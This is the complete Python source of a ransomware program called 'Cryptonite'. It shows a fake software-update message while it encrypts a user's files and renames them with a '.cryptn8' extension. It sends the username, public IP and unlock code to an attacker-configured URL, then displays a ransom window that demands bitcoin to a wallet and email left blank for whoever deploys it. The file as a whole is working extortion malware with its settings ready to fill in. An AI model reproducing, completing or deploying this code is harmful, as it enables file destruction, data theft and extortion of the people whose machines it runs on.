# imports

import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import time
import requests as r
import json
import tqdm
import pymsgbox._native_win as pymsgbox
import pymsgbox as pmb


# ----------------> Cryptonite program begins here. <---------------- #


key = Fernet.generate_key()
fe = Fernet(key)
dkrpt = random.randint(100000, 999999)
uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")
# print(dkrpt)

# some GLOBALS

URL = ""                        # <----  REQUIRED
BTC_AMOUNT = ""                 # <----  REQUIRED
BTC_WALLET = ""                 # <----  REQUIRED
EMAIL = ""                      # <----  REQUIRED
EXT = ".cryptn8"                # <----  OPTIONAL


fileLists = []      # stores the files to be encrypted
fileList = []       # stores the files to be decrypted


EXCLUDED_DIRS = [   "/Windows",
                    "/Program Files",
                    "/Program Files (x86)",
                    "/AppData"
                ]


class Cryptonite():
    def __init__(self,key,fe,dkrpt,uniqKey):
        self.key = key
        self.fernetEncrypt = fe
        self.decryptPlease = dkrpt
        self.uniqueKey = uniqKey


    def sendKeys(self):
        id = uniqKey
        user = os.getlogin()
        key = self.decryptPlease
        try:
            ip = r.get("https://ident.me/").text
            jsonFormat = {
                "uniqueId": id,
                "user": user,
                "key": key,
                "ip": ip
            }
            r.post(URL, data=json.dumps(jsonFormat))
        except:
            pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
            exit()



    def findFiles(self):
        
        print("Please be patient, checking for new updates...\n")
        time.sleep(5)
        print("Update found! Downloading the files... \n")
        for root, dir, file in os.walk('./testfolder'):
            for i in range(len(EXCLUDED_DIRS)):
                if EXCLUDED_DIRS[i] in root:
                    break
                else:
                    if i == len(EXCLUDED_DIRS) - 1:
                        for files in file:
                            files = os.path.join(root, files)
                            fileLists.append(files)

        print("Download Completed!\n")
        time.sleep(2)
        print("Installing the Updates. This might take some time. Please be patient... \n")
        self.encrypt()
        os.system("cls" if os.name == 'nt' else "clear") 



    def encrypt(self):
        
        for file in tqdm.tqdm(fileLists):
            flag = 0
            newfile = str(file)+EXT
            try:
                with open(file, "rb") as f:
                    data = f.read()
                    encryptedData = self.fernetEncrypt.encrypt(data)
            except:
                flag = 1
            if flag == 0:
                try:
                    with open (file, "wb") as f:
                        fileList.append(file)
                        f.write(encryptedData)
                    os.rename(file, newfile)
                except:
                    pass 

      
  
    def decrypt(self):
        for files in fileList:
            flag = 0
            try:
                with open(str(files)+EXT, "rb") as f:
                    data = f.read()
            except:
                flag = 1
            if flag == 0:
                try:
                    with open(str(files)+EXT, "wb") as f:
                        decryptedData = self.fernetEncrypt.decrypt(data)
                        f.write(decryptedData)
                    os.rename(str(files)+EXT, files)
                except:
                    pass



class System(Cryptonite):
    def __init__(self):
        super().__init__(key,fe,dkrpt,uniqKey)


    def warningScreen(self):
        import tkinter as tk
        from tkinter.filedialog import askopenfilename
        window = tk.Tk()

        filetypes = [("All Files", "*.*")]

        def open_file():
            path = askopenfilename(filetypes = filetypes)
            if not path:
                return
            try:
                with open(path, "r") as f:
                    try:
                        text = f.read()
                        txt_editor.delete("1.0", tk.END)
                        txt_editor.insert("1.0", text)
                    except:
                        txt_editor.delete("1.0", tk.END)
                        txt_editor.insert("1.0", "ERROR: Unsupported File Format.")
            except:
                txt_editor.delete("1.0", tk.END)
                txt_editor.insert("1.0", "ERROR: Insufficient Permission.")

        def clear():
            txt_editor.delete("1.0", tk.END)
        
        def clear1(*args):
            decryption_key.delete("0", tk.END)

        def key_collect():
            try:
                key = int(decryption_key.get())
                if int(key) == self.decryptPlease:
                    self.decrypt()
                    window.destroy()
                else:
                    pmb.confirm("Wrong KEY!", buttons=['OK'])
                    window.destroy()
                    exit()
            except:
                pmb.confirm("Wrong KEY!", buttons=['OK'])
                window.destroy()
                exit()



        window.title("Cryptonite")

        window.rowconfigure(0, minsize = 700, weight = 1)
        window.columnconfigure(0, minsize = 1000, weight = 1)
        window.columnconfigure(1, minsize = 300, weight = 1)


        frm_main = tk.Frame(master = window, bg = "black")
        frm_main.grid(row = 0, column = 0, sticky = "nsew", padx = 2, pady = 2)

        frm_main.rowconfigure([0,1,2,3,4,5,6,7], weight = 1)
        frm_main.columnconfigure(0, weight = 1)
        frm_main.columnconfigure(1, weight = 1)

        lbl_main = tk.Label(master = frm_main, text = "WARNING!", font=("Apple Chancery", 50), fg = "red", bg = "black")
        lbl_main.grid(row = 0, column = 0, pady = 5, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "Some / All of Your Files Have Been Encrypted!", font=("Apple Chancery", 40), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 1, column = 0, columnspan = 2)
        decryption_key = tk.Entry(master = frm_main, font=("Apple Chancery", 25), relief = tk.SUNKEN, borderwidth = 3, fg = "grey")
        decryption_key.grid(row = 2, column = 0, columnspan = 1, sticky = "e")
        decryption_key.insert("0", "DECRYPTION_KEY")
        decryption_key.bind("<Button-1>", clear1)
        decryption_key_button = tk.Button(master = frm_main, text = "Submit", font=("Apple Chancery", 18), relief = tk.RAISED, borderwidth = 2, command = key_collect)
        decryption_key_button.grid(row = 2, column = 1, sticky = "w", padx = 5)
        lbl_main1 = tk.Label(master = frm_main, text = "It uses military grade encryption to encrypt your files. It requires a DECRYPTION_KEY for decryption process.\nIf you think its a joke, try opening up your files from the file viewer on the right hand side of this frame.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 3, column = 0, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "Do not Close this Window! Else face the consequences!", font=("Apple Chancery", 25), bg = "black", fg = "red")
        lbl_main1.grid(row = 4, column = 0, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "What you can do?", font=("Apple Chancery", 20), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 5, column = 0, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY, 1. Send us the specified amount of BTC to the address mentioned below. 2. Send us the\nvalid screenshots via email along with your UNIQUE_ID. Do that and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 6, column = 0, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 7, column = 0, sticky = "w", columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: {self.uniqueKey}", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 7, column = 0, sticky = "e", columnspan = 2)

        frm_editor = tk.Frame(bg = "black", master = window)
        frm_editor.grid(row = 0, column = 1, sticky = "nsew", padx = 2, pady = 2)

        frm_editor.rowconfigure(0, minsize = 20, weight = 0)
        frm_editor.columnconfigure(0, minsize = 0, weight = 1)
        frm_editor.rowconfigure(1, minsize = 600, weight = 1)


        btn_editor = tk.Button(master = frm_editor, text = "Open File", borderwidth = 2, command = open_file)
        btn_editor.grid(row = 0, column = 0, padx = 2, pady = 2, sticky = "e")

        btn_editor1 = tk.Button(master = frm_editor, text = "Clear Screen", borderwidth = 2, command = clear)
        btn_editor1.grid(row = 0, column = 1, padx = 2, pady = 2, sticky = "ns")

        txt_editor = tk.Text(master = frm_editor)
        txt_editor.grid(row = 1, column = 0, padx = 2, pady = 2, sticky = "nsew", columnspan = 2)
        txt_editor.insert("3.0", "Open file that ends with .cryptn8 extension and see it is encrypted.")

        window.mainloop()
        


if __name__ == "__main__":
    
    cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
    window = System()

    cryptn8.sendKeys()
    cryptn8.findFiles()
    window.warningScreen()
